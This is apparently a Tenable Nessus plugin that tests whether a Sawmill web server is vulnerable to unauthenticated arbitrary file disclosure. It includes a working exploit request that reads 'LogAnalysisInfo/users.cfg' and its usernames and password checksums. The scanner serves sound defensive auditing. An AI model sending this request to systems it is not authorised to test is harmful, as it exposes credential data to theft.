#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(50431);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/12/14 20:22:11 $");

  script_bugtraq_id(44292);
  script_osvdb_id(68820);
  script_xref(name:"EDB-ID", value:"15298");
  script_xref(name:"Secunia", value:"41931");

  script_name(english:"Sawmill 8.x < 8.1.7.3 Arbitrary File Disclosure");
  script_summary(english:"Reads file 'LogAnalysisInfo/users.cfg'.");

  script_set_attribute(attribute:"synopsis", value:
"It was possible to read arbitrary files from the remote system.");
  script_set_attribute(attribute:"description", value:
"The version of Sawmill running on the remote host fails to properly
restrict access to critical functions to an unauthorized user. An
unauthenticated, remote attacker can exploit this, via a specially
crafted request, to read arbitrary files from the remote system.

Note that the version of Sawmill running on the remote host may be
affected by several other vulnerabilities, including arbitrary command
execution and cross-site scripting vulnerabilities; however, Nessus
has not checked for them.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2010/Oct/185");
  # https://web.archive.org/web/20120612143344/https://www.sec-consult.com/files/20101021-0_sawmill_multiple_critical_vulns.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4af3942f");
  script_set_attribute(attribute:"see_also", value:"http://www.sawmill.net/version_history8.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Sawmill version 8.1.7.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  # websvr runs as system/root

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/10/21");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/10/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/11/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:sawmill:sawmill");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("sawmill_detect.nasl");
  script_require_ports("Services/www", 8987, 8988);
  script_require_keys("installed_sw/Sawmill");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Sawmill";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:8988, embedded:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];

# Works on both *nix/Windows
exploit = dir + "/?a=ee&exp=error(read_file('LogAnalysisInfo/users.cfg'))";

res = http_send_recv3(method:"GET", item:exploit, port:port, exit_on_fail:TRUE);

if (
  res[2] &&
  '>Sawmill Alert</' >< res[2] &&
  'root_admin &#61'  >< res[2] &&
  'username &#61'    >< res[2] &&
  'password_checksum &#61' >< res[2] &&
  'language &#61' >< res[2]
)
{
  contents = strstr(res[2], '<pre>users &#61');
  contents = contents - strstr(contents,'</pre>') - '<pre>';
  if (empty_or_null(contents)) contents = res[2];

  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    generic    : TRUE,
    request    : make_list(build_url(qs:exploit, port:port)),
    output     : contents
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir, port:port));
